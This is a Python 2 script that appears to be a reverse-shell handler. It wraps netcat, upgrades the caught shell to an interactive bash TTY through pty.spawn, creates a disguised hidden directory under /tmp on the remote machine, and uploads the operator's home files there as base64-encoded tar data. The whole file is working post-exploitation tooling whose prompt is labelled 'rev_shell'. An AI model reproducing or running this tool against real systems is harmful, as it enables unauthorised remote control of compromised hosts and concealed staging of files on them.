#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import pty
import sys
import time
import fcntl
import base64
import random
import string
import threading
import subprocess


def rand_dir():
    tmp_dir = '/tmp/.session-00ac-'

    for _ in range(4):
        tmp_dir += random.choice(string.ascii_lowercase)

    return tmp_dir


def upload_home(p, my_tar_home):
    f = open(my_tar_home)
    contents = f.read()
    f.close()

    contents_encoded = base64.b64encode(contents)

    p.stdin.write('echo {0} | python2 -c "import base64; open(\'home.tar\', \'w\').write(base64.b64decode(raw_input()))"\n'
                  .format(contents_encoded))

    p.stdin.flush()

    p.stdin.write('tar xf home.tar\n')
    p.stdin.flush()

    p.stdin.write('rm home.tar\n')
    p.stdin.flush()


def setup_home(p, my_home):
    p.stdin.write('mkdir -p {0}\n'.format(my_home))
    p.stdin.flush()

    p.stdin.write('export HOME={0}\n'.format(my_home))
    p.stdin.flush()

    p.stdin.write('cd {0}\n'.format(my_home))
    p.stdin.flush()

    base_path = os.path.dirname(os.path.realpath(__file__))
    n_files = os.popen('ls -1 {0} | wc -l'.format(base_path + '/my_home/')).read().strip()

    if int(n_files) > 0:
        my_tar_home = os.path.join(base_path, '.tmp/my_home.tar')
        os.system('cd {0}; tar chf ../.tmp/my_home.tar ./*'.format(base_path + '/my_home/'))
        upload_home(p, my_tar_home)
        os.system('rm {0}'.format(my_tar_home))

    p.stdin.write('export PS1="\[$(tput setaf 1)\]┌─╼\[$(tput setaf 5)\] \u@\h \[$(tput setaf 7)\][\w]\n\[$(tput setaf 1)\]\[$(tput setaf 1)\]└╼ \[$(tput setaf 7)\][rev_shell]\[$(tput setaf 7)\] "\n')
    p.stdin.flush()


def recv_data(p, flag):
    while not flag.isSet():
        time.sleep(0.01)
        try:
            data = p.stdout.read(1024)

            if data:
                sys.stdout.write(data)
                sys.stdout.flush()

        except:
            pass


def setup_tty(nc_command):
    try:
        env_term = os.environ['TERM']
        saved_conf = os.popen('stty -g').read()
        rows, columns = os.popen('stty size').read().split()

        os.system('stty raw -echo')
        master, slave = pty.openpty()

        p = subprocess.Popen(nc_command.split(), stdin=subprocess.PIPE, stdout=slave, stderr=slave, close_fds=True)
        p.stdout = os.fdopen(os.dup(master), 'r+')
        p.stderr = os.fdopen(os.dup(master), 'r+')

        os.close(master)
        os.close(slave)

        sys.stdout.write(p.stdout.read(1))

        fd = p.stdout.fileno()
        fl = fcntl.fcntl(fd, fcntl.F_GETFL)
        fcntl.fcntl(fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)

        flag = threading.Event()
        t = threading.Thread(target=recv_data, args=[p, flag])
        t.start()

        p.stdin.write("python -c 'import pty; pty.spawn(\"/bin/bash\")'\n")
        p.stdin.flush()
        time.sleep(2)

        p.stdin.write('export TERM={0}\n'.format(env_term))
        p.stdin.flush()

        p.stdin.write('stty rows {0} columns {1}\n'.format(rows, columns))
        p.stdin.flush()

        my_home = rand_dir()
        setup_home(p, my_home)

        p.stdin.write('clear\n')
        p.stdin.flush()

        while True:
            line = sys.stdin.read(1)

            if line == '':
                break

            if ord(line[0]) == 4:
                break

            p.stdin.write(line)

        flag.set()

    except Exception, e:
        print('[-] Unexpected error: {0}'.format(e))

    finally:
        os.system('stty raw echo')
        os.system('stty {0}'.format(saved_conf))
        os.system('clear')
        p.kill()
        sys.exit(0)


def main():
    nc_params = ''

    if len(sys.argv) > 1:
        nc_params = ' '.join(sys.argv[1:])

    nc_command = 'nc ' + nc_params

    setup_tty(nc_command)


if __name__ == '__main__':
    main()
